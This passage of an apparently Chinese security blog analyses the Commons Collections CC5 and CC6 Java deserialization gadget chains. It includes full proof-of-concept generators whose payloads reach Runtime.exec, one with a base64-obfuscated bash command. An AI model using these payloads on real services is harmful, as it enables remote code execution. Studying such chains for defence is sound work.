class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</span></span><br><span class="line">        Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="解析-6"   >
          <a href="#解析-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-6" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="BadAttributeValueExpException-readObject"   >
          <a href="#BadAttributeValueExpException-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException.readObject()"></a><code>BadAttributeValueExpException.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110613623.png" alt="image-20220801110613623"></p>
<p><code>valObj</code>即为<code>TiedMapEntry</code></p>

        <h3 id="TiedMapEntry-toString-gt-getValue"   >
          <a href="#TiedMapEntry-toString-gt-getValue" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry-toString-gt-getValue" class="headerlink" title="TiedMapEntry.toString()-&gt;getValue()"></a><code>TiedMapEntry.toString()-&gt;getValue()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110414584.png" alt="image-20220801110414584"></p>
<p>后续的<code>map</code>即为<code>LazyMap</code>，<code>key</code>为<code>123</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110428194.png" alt="image-20220801110428194"></p>

        <h3 id="LazyMap-get-1"   >
          <a href="#LazyMap-get-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-1" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h2 id="🔺注"   >
          <a href="#🔺注" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注" class="headerlink" title="🔺注"></a>🔺注</h2>
      <p>在设置<code>BadAttributeValueExpException</code>对象时，使用的是其中的<code>Field</code>来进行设置的</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">val.set(poc,tiedmap);</span><br></pre></td></tr></table></div></figure>

<p>原因在于在<code>BadAttributeValueExpException</code>构造函数及<code>readObject</code>函数中，有如下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151544294.png" alt="image-20220801151544294"></p>
<p>这样就能在序列化时不进行本地<code>RCE</code>，而在服务器反序列化时进行<code>RCE</code>，因为如果在序列化时进行本地<code>RCE</code>，<code>val</code>就会由于链子变成<code>Runtime</code>类，由于<code>Runtime</code>没办法直接序列化，所以其<code>val</code>就会变成如下执行命令结果的字符串，从而在反序列时没办法调用到<code>TiedMapEntry.toString()</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151900635.png" alt="image-20220801151900635"></p>
<p>对比原<code>POC</code>如下，其<code>val</code>在序列化时还是一个<code>TiedMapEntry</code>对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801152047107.png" alt="image-20220801152047107"></p>

        <h2 id="无数组"   >
          <a href="#无数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#无数组" class="headerlink" title="无数组"></a>无数组</h2>
      <p>至于无数组版本的，即如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802155244072.png" alt="image-20220802155244072"></p>
<p>做点小改动，在<code>TiedMapEntry</code>中传入<code>TemplatesImpl</code>即可，确保在<code>LazyMap.get()</code>的时候，传入的<code>key</code>为<code>TemplatesImpl</code>，从而进行调用到对应的<code>TemplatesImpl.newTransformer()</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802154737033.png" alt="image-20220802154737033"></p>
<p>相关<code>POC</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> test.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, IOException </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Li90ZXN0LnNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl tempIm = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invTransf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);</span><br><span class="line">        <span class="comment">//调用Get方法</span></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,tempIm);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</span></span><br><span class="line">        setField(poc,<span class="string">&quot;val&quot;</span>,tiedmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="六、CC6"   >
          <a href="#六、CC6" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、CC6" class="headerlink" title="六、CC6"></a>六、CC6</h1>
      
        <h2 id="JAVA源码版本-8u40-5"   >
          <a href="#JAVA源码版本-8u40-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-5" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171443518.png" alt="image-20220801171443518"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()-&gt;hash()</span><br><span class="line">TiedMapEntry.hashCode()-&gt;this.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-5"   >
          <a href="#限制-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-5" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无限制</p>

        <h2 id="Poc"   >
          <a href="#Poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;./test.sh&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-7"   >
          <a href="#解析-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-7" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="HashSet-readObject"   >
          <a href="#HashSet-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a><code>HashSet.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171648405.png" alt="image-20220801171648405"></p>
<p>这个<code>map</code>即设置为<code>HashMap</code></p>

        <h3 id="HashMap-put"   >
          <a href="#HashMap-put" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashMap-put" class="headerlink" title="HashMap.put()"></a><code>HashMap.put()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171743740.png" alt="image-20220801171743740"></p>
<p>这个<code>key</code>后续设置为<code>TiedMapEntry</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171856068.png" alt="image-20220801171856068"></p>

        <h3 id="TiedMapEntry-hashCode"   >
          <a href="#TiedMapEntry-hashCode" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a><code>TiedMapEntry.hashCode()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171928099.png" alt="image-20220801171928099"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171953683.png" alt="image-20220801171953683"></p>
<p>这里的<code>map</code>即设置为<code>Lazymap</code></p>

        <h3 id="LazyMap-get-2"   >
          <a href="#LazyMap-get-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-2" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h2 id="🔺注-1"   >
          <a href="#🔺注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注-1" class="headerlink" title="🔺注"></a>🔺注</h2>
      
        <h3 id="1-Hashset设置"   >
          <a href="#1-Hashset设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Hashset设置" class="headerlink" title="1.Hashset设置"></a>1.<code>Hashset</code>设置</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加至少一个元素，方便后续获取</span></span><br><span class="line">hashset.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap hashset_map = (HashMap) field.get(hashset);</span><br></pre></td></tr></table></div></figure>

<p>获取<code>HashSet</code>的<code>map</code>成员为<code>hashset_map</code></p>

        <h3 id="2-HashMap设置"   >
          <a href="#2-HashMap设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HashMap设置" class="headerlink" title="2.HashMap设置"></a>2.<code>HashMap</code>设置</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取HashMap中的table,用来获取HashMap中保存的元素</span></span><br><span class="line"><span class="comment">//transient Node&lt;K,V&gt;[] table;</span></span><br><span class="line">Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取array为HashSet的成员map中保存的元素数组</span></span><br><span class="line">Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"><span class="comment">//获取node为保存在hashset中的元素,其类为一个hashmap</span></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置hashset中的一个元素hashmap的key为TiedMapEntry</span></span><br><span class="line">Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(node,tiedmap);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-writeObject和readObject的关系"   >
          <a href="#3-writeObject和readObject的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-writeObject和readObject的关系" class="headerlink" title="3.writeObject和readObject的关系"></a>3.<code>writeObject</code>和<code>readObject</code>的关系</h3>
      <p>在<code>HashSet</code>的<code>readObject</code>中可以看到，<code>//..</code>为省略的代码部分</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">int</span> size = s.readInt();</span><br><span class="line">	<span class="comment">//.......</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>按理说，调用<code>map.put</code>，其函数如下，我们需要控制<code>e</code>(即下面的<code>key</code>)为<code>TiedMapEntry</code>才能调用到<code>TiedMapEntry.hashCode</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>但是<code>E e = (E) s.readObject();</code>，也就是得看对应的<code>HashSet.writeObject</code>中将什么序列化了</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        